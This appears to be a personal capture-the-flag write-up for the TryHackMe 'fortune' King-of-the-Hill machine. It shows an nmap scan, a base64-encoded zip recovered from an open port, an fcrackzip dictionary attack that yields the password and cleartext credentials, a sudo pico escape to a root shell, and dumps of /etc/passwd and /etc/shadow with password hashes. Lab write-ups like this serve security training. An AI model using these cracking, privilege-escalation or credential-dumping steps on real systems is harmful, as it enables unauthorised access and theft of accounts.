 

THM-KOTH: fortune
============================

> labruhtooryboi | December 6, 2020

# 10.10.16.30
# fortune.thm

					# reconnisance


(after a scan with rust)
'''
nmap -p 21,22,80,111,2049,3333,9999,39021,35215,39417,45077 -sC -sV -v -oN nmapinit.txt 10.10.16.30
'''

'''
Nmap scan report for 10.10.16.30
Host is up (0.19s latency).

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:ae:18:87:b8:c3:35:b6:3a:af:0e:a4:c3:a2:ef:13 (RSA)
|   256 42:cf:fe:0d:cb:92:24:b9:8f:dc:11:d4:10:a7:a0:3e (ECDSA)
|_  256 5c:fc:bc:c9:3a:01:b1:b6:78:ac:66:3c:34:8f:22:2a (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 0FCB7B4E683ADF2D2EE21691E052A73D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wheel of Fortune!
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33589/tcp6  mountd
|   100005  1,2,3      37448/udp   mountd
|   100005  1,2,3      39021/tcp   mountd
|   100005  1,2,3      58613/udp6  mountd
|   100021  1,3,4      35215/tcp   nlockmgr
|   100021  1,3,4      37859/udp6  nlockmgr
|   100021  1,3,4      38013/tcp6  nlockmgr
|   100021  1,3,4      55014/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
3333/tcp  open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAFi+hlE66unrHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAANYbs1fWG7NX3V4CwAB
|     BAAAAAAEAAAAAI+oj/zT9LJIQ2uXbup/hmeBnOqxOFtNmYsvS7Kav9NQSwcIOurp6x8AAAATAAAA
|     UEsBAh4DCgAJAAAAWL6GUTrq6esfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQADWG7NX3V4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
9999/tcp  open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
35215/tcp open  nlockmgr   1-4 (RPC #100021)
39021/tcp open  mountd     1-3 (RPC #100005)
39417/tcp open  mountd     1-3 (RPC #100005)
45077/tcp open  mountd     1-3 (RPC #100005)
1 service unrecognized despite returning data.
'''







					# enumeration



'''
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/_styles (Status: 301)
/favicon.ico (Status: 200)
/server-status (Status: 403)
'''

'''
(going back to nmap scan)

UEsDBAoACQAAAFi+hlE66unrHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAANYbs1fWG7NX3V4CwABBAAAAAAEAAAAAI+oj/zT9LJIQ2uXbup/hmeBnOqxOFtNmYsvS7Kav9NQSwcIOurp6x8AAAATAAAAUEsBAh4DCgAJAAAAWL6GUTrq6esfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU BQADWG7NX3V4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
'''



(base64 decode returned nothing, however base642file)
'''
application.zip 
'''

'''
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt application.zip 

PASSWORD FOUND!!!!: pw == chubby

unzip application.zip 

cat creds.txt

fortuna:OGYwY2E2MT
'''



					# privelage escalation
(gtfobins)				
'''
sudo pico
^R^X
reset; sh 1>&0 2>&0
'''



					# interesting things

>flags
'''
(fortuna desktop/chess)
7b1ded3f11db0ff3a0deba11f92364c7
'''

'''
'''

>users
'''
fortuna
hermes
kairos
lucky_shell
tyche
root
amechania
'''

>passwds
'''
OGYwY2E2MT
'''

'''
'''

>files and dirs
'''
pico
'''

'''
'''

>root stuff 


'''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fortuna:x:1000:1000:fortuna,,,:/home/fortuna:/bin/bash
kairos:x:1001:1001::/home/kairos:/bin/bash
hermes:x:1002:1002::/home/hermes:/bin/bash
tyche:x:1003:1003::/home/tyche:/bin/bash
amechania:x:1004:1004::/var/ftp:/bin/bash
ftp:x:111:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
statd:x:112:65534::/var/lib/nfs:/usr/sbin/nologin
'''






'''
root:$6$txBN3nOD$qTepINaz2HN4MxSUWWJ/RAbjWxMwPE3gaS0dp2TZCRs6mLmjeT.YUWqioMhq5W7CUGueB4jmo6rJCVncofO701:
18603:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18380:0:99999:7:::
uuidd:*:18380:0:99999:7:::
dnsmasq:*:18380:0:99999:7:::
landscape:*:18380:0:99999:7:::
sshd:*:18380:0:99999:7:::
pollinate:*:18380:0:99999:7:::
fortuna:$6$W7qQLjE2$DO7uqm4b30/zNXQARSni1uMNLdEbkGwUftiAncoDiSQTeI/5dM2coZ8XGSGoO/RpaeAtgWTsDLuewmLNZ7uj
N1:18602:0:99999:7:::
kairos:$6$VhYM27Ti$RHzXJHEA04P0AkoxXSvdZpzYqFnDMlChww379SbAXsQbl2G5B18Fgw7DsHBpYtmsww2zUNGSRNowc/oasdfNH
/:18602:0:99999:7:::
hermes:$6$AZJNuszJ$6H5hfO1I2L7lbBaMMvd.3dv4wFkYHyc.QV5g7cDsZHo3.4.EHmkJhTdvfaxI11UURPeK7g8s24ODfcAKRdQxA
1:18602:0:99999:7:::
tyche:$6$AsAEh7fo$2YoyFv6/870Zth3hcDCFlan5.GkwUBpTI8hWM8CFSV8mzlXwEDKoTsvVb.tc4foRZmGVT0mxiPrn/aYSfo3571
:18602:0:99999:7:::
amechania:$6$VhJYk5sO$iq5NEzFxz0y4fSiBzn/U3WQYDj/uZTOuL4CuQeCuvDYlL6lv8X4Xt3NjZwjt3STjsO0pa/1Q2k/O.BPu02
uLZ/:18602:0:99999:7:::
ftp:*:18380:0:99999:7:::
statd:*:18380:0:99999:7:::
'''
